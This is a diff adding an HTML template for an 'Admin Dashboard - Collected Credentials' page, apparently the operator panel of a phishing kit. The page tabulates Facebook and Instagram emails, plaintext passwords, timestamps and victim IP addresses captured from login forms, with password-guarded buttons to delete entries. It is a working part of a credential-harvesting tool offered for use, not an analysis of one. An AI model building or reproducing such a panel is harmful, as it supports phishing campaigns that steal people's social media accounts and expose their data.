@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin - Collected Credentials</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 0; 
+            padding: 20px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        h1 { 
+            color: #333; 
+            margin-bottom: 20px; 
+            text-align: center;
+        }
+        .stats {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .table-container {
+            overflow-x: auto;
+            margin-top: 20px;
+        }
+        table { 
+            border-collapse: collapse; 
+            width: 100%; 
+            min-width: 600px;
+        }
+        th, td { 
+            border: 1px solid #ddd; 
+            padding: 12px; 
+            text-align: left; 
+        }
+        th { 
+            background-color: #343a40; 
+            color: white;
+            font-weight: bold;
+        }
+        .facebook { background-color: #e3f2fd; }
+        .instagram { background-color: #fce4ec; }
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-size: 18px;
+        }
+        .back-btn {
+            display: inline-block;
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .back-btn:hover {
+            background: #0056b3;
+        }
+        .refresh-btn {
+            background: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .refresh-btn:hover {
+            background: #1e7e34;
+        }
+        .delete-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .delete-btn:hover {
+            background: #c82333;
+        }
+        .clear-all-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .clear-all-btn:hover {
+            background: #c82333;
+        }
+        .actions {
+            text-align: right;
+            margin-bottom: 10px;
+        }
+        
+        /* Password Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 10000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        
+        .modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 30px;
+            border-radius: 10px;
+            width: 450px;
+            max-width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .password-input-container {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .modal input {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        
+        .modal input:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 3px rgba(0,123,255,0.1);
+        }
+        
+        .modal h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .modal p {
+            margin-bottom: 20px;
+            color: #666;
+        }
+        
+        .modal-buttons {
+            margin-top: 15px;
+        }
+        
+        .modal-buttons button {
+            margin: 0 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .confirm-btn {
+            background: #dc3545;
+            color: white;
+        }
+        
+        .cancel-btn {
+            background: #6c757d;
+            color: white;
+        }
+        
+        .error-message {
+            color: #dc3545;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            .container {
+                padding: 15px;
+                margin: 0;
+                border-radius: 0;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .stats {
+                padding: 10px;
+            }
+            .clear-all-btn, .refresh-btn {
+                padding: 8px 15px;
+                font-size: 14px;
+            }
+            th, td {
+                padding: 8px;
+                font-size: 12px;
+            }
+            .delete-btn {
+                padding: 3px 6px;
+                font-size: 10px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            th, td {
+                padding: 6px;
+                font-size: 11px;
+            }
+            .actions {
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Admin Dashboard - Collected Credentials</h1>
+        
+        <div class="stats">
+            <strong>Total Entries: {{ total }}</strong>
+            <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
+        </div>
+        
+        {% if credentials %}
+        <div class="actions">
+            <button class="clear-all-btn" onclick="clearAllCredentials()">🗑️ Clear All</button>
+        </div>
+        
+        <div class="table-container">
+            <table>
+                <tr>
+                    <th>Platform</th>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Timestamp</th>
+                    <th>IP Address</th>
+                    <th>Action</th>
+                </tr>
+                {% for cred in credentials %}
+                <tr class="{{ cred.platform.lower() }}" id="row-{{ loop.index0 }}">
+                    <td><strong>{{ cred.platform }}</strong></td>
+                    <td>{{ cred.email }}</td>
+                    <td>{{ cred.password }}</td>
+                    <td>{{ cred.timestamp }}</td>
+                    <td>{{ cred.ip }}</td>
+                    <td><button class="delete-btn" onclick="deleteCredential({{ loop.index0 }})">❌</button></td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+        {% else %}
+        <div class="no-data">
+            <p>📭 No credentials collected yet.</p>
+            <p>Users need to submit login forms first.</p>
+        </div>
+        {% endif %}
+        
+
+    </div>
+    <!-- Password Modal -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content">
+            <h3 id="modalTitle">Enter Admin Password</h3>
+            <p id="modalMessage">Enter the admin password to confirm deletion:</p>
+            <div class="password-input-container">
+                <input type="password" id="adminPassword" placeholder="Enter admin password">
+            </div>
+            <div class="error-message" id="errorMessage">Sorry you can't delete this because of your wrong password</div>
+            <div class="modal-buttons">
+                <button class="confirm-btn" onclick="confirmDelete()">Confirm & Delete</button>
+                <button class="cancel-btn" onclick="closeModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentAction = null;
+        let currentIndex = null;
+        
+        function deleteCredential(index) {
+            currentAction = 'delete';
+            currentIndex = index;
+            document.getElementById('modalTitle').textContent = 'Delete Entry';
+            document.getElementById('modalMessage').textContent = 'Enter the admin password to delete this entry:';
+            document.getElementById('passwordModal').style.display = 'block';
+            document.getElementById('adminPassword').focus();
+        }
+        
+        function clearAllCredentials() {
+            currentAction = 'clear';
+            currentIndex = null;
+            document.getElementById('modalTitle').textContent = 'Clear All Credentials';
+            document.getElementById('modalMessage').textContent = 'Enter the admin password to delete ALL credentials:';
+            document.getElementById('passwordModal').style.display = 'block';
+            document.getElementById('adminPassword').focus();
+        }
+        
+        function closeModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            document.getElementById('adminPassword').value = '';
+            document.getElementById('errorMessage').style.display = 'none';
+            currentAction = null;
+            currentIndex = null;
+        }
+        
+        async function confirmDelete() {
+            const password = document.getElementById('adminPassword').value;
+            const errorDiv = document.getElementById('errorMessage');
+            
+            if (!password) {
+                errorDiv.textContent = 'Please enter the admin password';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            try {
+                let url, body;
+                
+                if (currentAction === 'delete') {
+                    url = `/api/delete-credential/${currentIndex}`;
+                } else if (currentAction === 'clear') {
+                    url = '/api/clear-all-credentials';
+                }
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ password: password })
+                });
+                
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    closeModal();
+                    location.reload();
+                } else {
+                    errorDiv.textContent = result.message;
+                    errorDiv.style.display = 'block';
+                }
+            } catch (error) {
+                errorDiv.textContent = 'Error processing request';
+                errorDiv.style.display = 'block';
+            }
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('passwordModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+        
+        // Handle Enter key in password field
+        document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                confirmDelete();
+            }
+        });
+    </script>
+</body>
+</html>
